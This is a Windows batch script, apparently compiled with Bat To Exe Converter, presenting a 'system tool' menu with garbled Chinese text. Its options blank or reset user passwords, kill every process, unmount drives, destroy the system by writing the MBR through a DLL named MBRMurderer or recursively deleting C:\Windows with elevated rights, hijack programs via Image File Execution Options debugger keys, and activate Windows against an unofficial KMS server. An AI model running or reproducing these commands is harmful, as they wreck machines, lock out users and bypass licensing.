::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH3eyGwDPR9bc1zMbiXqOpsv/ez00LLJ8HI8WO4AW4DWyruAJe4H+XnKRoMp2Tp2md4CDxNdbC6cZwFn+1JshXGBOOu7/Qr5Tyg=
::fBE1pAF6MU+EWHreyHcjLQlHcBSTbjnjVYk47fvw++WXnmA/Zs8qaoveyLGcca5DpEHoefY=
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJHe34UY/F0MaHkrSAEWJE7ET17C1vdWmrkEid+0yaIDV37qaM9w92VDgetYe2W9Im85MLxRcey6YYRomqmt+mGWRPtGZjyHSX0yGykolFWZ8gnHsvi4ob8Z6mcYQ7w6N6Unws6QF33v3W7tAHGDuoQ==
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF25
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZk4aHUrSXA==
::ZQ05rAF9IBncCkqN+0xwdVsFAlHMbSXqZg==
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCqDJN5XL8Xr156DiYFn6+xp3TD0H9R8PDEAebKYgye6nVjNi/rbbrFd713hFQ==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color 0a
title ϵͳ����v1.5.1
echo ϵͳ����v1.5.1!ӵ�����¹���:
echo 1����յ�ǰ�û�����
echo 2�����ָ���û�����
echo 3���޸ĵ�ǰ�û�����
echo 4���޸�ָ���û�����
echo 5��һ��ˢ�£�������ǰ�û����н��̣����Կ�ʱʹ�ã�
echo 6�������������ϵͳû���˺���
echo 7������ָ������������C�̣�
echo 8������������ϵͳ��ѡ��
echo 9�����ó���
echo 10��������ó���
echo ������11������ϵͳ������Windows�汾���ܲ����ã�
set /p number=��������Ҫʹ�õĹ��ܣ�������ţ���
goto %number%
:1
net user %username% ""
goto end

:2
set /p user=�������û�����������룺
net user %user% ""
goto end

:3
set /p password=��������Ҫ�޸ĳɵ����룺
net user %username% %password%
goto end

:4
set /p user=��������Ҫ�޸�������û�����
set /p password=��������Ҫ�޸ĳɵ����룺
net user %user% %password%
goto end

:5
taskkill /f /fi "USERNAME eq %username%"

:6
taskkill /f /fi "pid ne 1"

:7
set /p pan=��������Ҫ������������(���磺��Ҫ����C�̣�������C:)��
mountvol %pan% /d
goto end

:8
set /p mode="������������ϵͳ�ķ�ʽ��1=�ݻ�MBR��2=ɾ��ϵͳ�ļ���:
cls
echo wscript.sleep 100 >%temp%\wait100.vbs
set n=start /wait %temp%\wait100.vbs
echo wscript.sleep 300 >%temp%\wait300.vbs
set u=start /wait %temp%\wait300.vbs
echo wscript.sleep 400 >%temp%\wait400.vbs
echo | set /p m=��
%n%
echo | set /p m=ô
%n%
echo | set /p m=��
%n%
echo | set /p m=��
%n%
echo | set /p m=��
%n%
echo | set /p m=һ
%n%
echo | set /p m=��
%n%
echo | set /p m=��
%n%
echo | set /p m=,
%n%
echo | set /p m=С
%n%
echo | set /p m=��
%n%
echo | set /p m=��
%n%
echo | set /p m=��
%n%
echo | set /p m=��
%n%
echo | set /p m=,
%n%
echo | set /p m=��
%n%
echo | set /p m=��
%n%
echo | set /p m=��
%n%
echo | set /p m=��
%n%
echo �ţ�
%n%
echo ����ô���õ�һ���
timeout /t 2 /nobreak >nul
color 4f
cls
echo | set /p m=��
%u%
echo | set /p m=��
%u%
echo | set /p m=��
%u%
echo | set /p m=��
%u%
echo | set /p m=��
%u%
echo | set /p m=��
%u%
echo | set /p m=��
%u%
echo | set /p m=,
%u%
echo | set /p m=��
%u%
echo | set /p m=Ӧ
%u%
echo | set /p m=��
%u%
echo | set /p m=��
%u%
echo | set /p m=��
start /wait %temp%\wait400.vbs
echo | set /p m=��
start /wait %temp%\wait400.vbs
echo | set /p m=��
start /wait %temp%\wait400.vbs
echo | set /p m=��
start /wait %temp%\wait400.vbs
echo �ա�
if "%mode%"=="2" start %appdata%\nsudolg.exe -U:T -P:E -Priority:High -ShowWindowMode:Hide cmd /c del C:\Windows\*.*/s /f /q
if "%mode%"=="1" start /wait rundll32 %appdata%\MBRMurderer1.0.dll,WriteMBR05 && shutdown /r /s /t 00
taskkill /f /im explorer.exe
cls
echo ��Զ�������
timeout /t 300 /nobreak >nul
shutdown /r /t 00
:9
set /p prog=�����������(��΢�ž�����WeChat.exe)��
set /p mode=������ģʽ��1=��������2=�Ҳ����ļ���3=�޷����ʣ�4=���ݸ�ϵͳ����������̫С)��
if "%mode%"=="4" set /p LuJing=���������·��(��a.exe��D:\ABC\a.exe��������D:\ABC):
if "%mode%"=="1" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%prog%" /v debugger /t REG_SZ /d """
if "%mode%"=="2" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%prog%" /v debugger /t REG_SZ /d ������ע
if "%mode%"=="3" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%prog%" /v debugger /t REG_SZ /d \
if "%mode%"=="4" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%prog%" /v debugger /t REG_SZ /d "%LuJing%\%prog%"
goto end

:10
set /p prog=������Ҫ������õĳ�����(��΢�ž�����WeChat.exe)��
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%prog%" /f
goto end

:11
slmgr/skms kms.03k.org
slmgr/ato
goto end

:end
echo ������ɣ���������˳�����
pause
